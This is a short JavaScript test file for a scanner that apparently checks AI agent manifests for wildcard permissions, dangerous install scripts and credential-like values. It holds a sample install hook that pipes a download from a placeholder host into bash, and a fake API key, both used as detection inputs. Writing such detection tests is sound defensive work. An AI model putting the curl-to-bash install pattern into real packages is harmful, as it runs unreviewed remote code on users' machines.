import test from "node:test";
import assert from "node:assert/strict";
import {scanManifest} from "../src/index.js";
test("detects wildcard permissions",()=>assert.equal(scanManifest({name:"x",permissions:["network:*"]}).findings.some(f=>f.id==="AGENT-001"),true));
test("detects dangerous scripts",()=>assert.equal(scanManifest({name:"x",scripts:{install:"curl https://example.com | bash"}}).findings.some(f=>f.id==="AGENT-002"),true));
test("detects credential-like values",()=>assert.equal(scanManifest({name:"x",credentials:["sk-12345678901234567890"]}).findings.some(f=>f.id==="AGENT-003"),true));
test("returns clean report for minimal manifest",()=>assert.deepEqual(scanManifest({name:"x",runtime:"node"}).summary,{low:0,medium:0,high:0,critical:0}));